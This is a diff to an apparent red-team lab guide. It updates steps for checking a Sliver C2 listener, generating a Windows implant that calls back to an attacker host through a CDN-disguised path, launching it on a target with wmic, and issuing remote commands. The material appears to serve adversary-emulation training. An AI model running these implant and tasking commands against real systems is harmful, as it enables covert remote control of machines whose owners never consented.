@@ -303,28 +303,43 @@ Verify that all service status cards display **● RUNNING** in green.
 
 **Objective**: Build an obfuscated Go beacon, route through the redirector prefix `/cloud/storage/objects`, and execute in-memory triage tools.
 
-#### Hands-On Steps:
-1. **Connect to the Sliver Teamserver**:
-   On your Kali workstation:
+#### Hands-On Steps (all verified 2026-10-04 against v1.7.7):
+
+> Sliver implants can NOT send custom headers, so unlike every other
+> framework there is no `X-Request-ID` to configure: the redirector matches
+> the Sliver route on path alone (`/cloud/storage/objects`).
+
+1. **Verify the HTTP listener** (created automatically at container start —
+   do NOT recreate it; a second `http` command fails with "port 80 is in use"):
    ```bash
-   sliver-client
+   docker exec c2stack-sliver-1 sh -c \
+     "printf 'jobs\nwebsites show edge\nexit\n' > /tmp/j.rc; sliver-client console --rc /tmp/j.rc"
    ```
-2. **Create the HTTP Listener**:
-   ```sliver
-   http -L <C2STACK_IP> -l 80 -n sliver-http
+   Expect job `http ... 80` and the `edge` website (`/`, `/assets`,
+   `/bundles`, `/script`, `/scripts` — CDN-disguise pages, not C2 paths).
+2. **Generate a Sliver payload** — a `session` implant calls straight back as
+   a taskable session; a `beacon` only checks in periodically and needs
+   `interactive` before it takes tasks:
+   ```bash
+   docker exec c2stack-sliver-1 sh -c \
+     "printf 'generate session --http <C2STACK_IP>:80/cloud/storage/objects --os windows --arch amd64 --save /tmp/sess.exe\nexit\n' > /tmp/g.rc; sliver-client console --rc /tmp/g.rc"
+   docker cp c2stack-sliver-1:/tmp/sess.exe ./sess.exe
    ```
-3. **Generate a Sliver Payload**:
-   ```sliver
-   generate beacon --http <C2STACK_IP>:80/cloud/storage/objects --os windows --arch amd64 --save ./beacon.exe
+3. **Execute & Interact** — deliver `sess.exe` to the target (WMI launch keeps
+   it detached from your SSH session):
+   ```cmd
+   wmic process call create 'C:\Users\vagrant\Downloads\sess.exe'
    ```
-4. **Execute & Interact**:
-   Deliver `beacon.exe` to a test host with the `X-Request-ID: cadre-c2` header configured.
-   ```sliver
-   beacons
-   use <beacon_id>
-   tasks
-   execute-assembly /opt/tools/Seatbelt.exe -group=system
+   Task it headlessly — no console needed:
+   ```bash
+   sliver-client implant --use <session_id> execute -o whoami
+   sliver-client implant --use <session_id> getuid
    ```
+   Notes that cost real debugging time: `execute` runs the binary directly
+   with NO shell (`>`, `|`, `&&` are literal arguments — wrap shell work in
+   `cmd.exe "/c ..."`); `implant --use` takes SESSION ids only; console `use`
+   selection is TUI-driven and does not work from scripts (use the `implant`
+   command group instead).
 
 ---
 
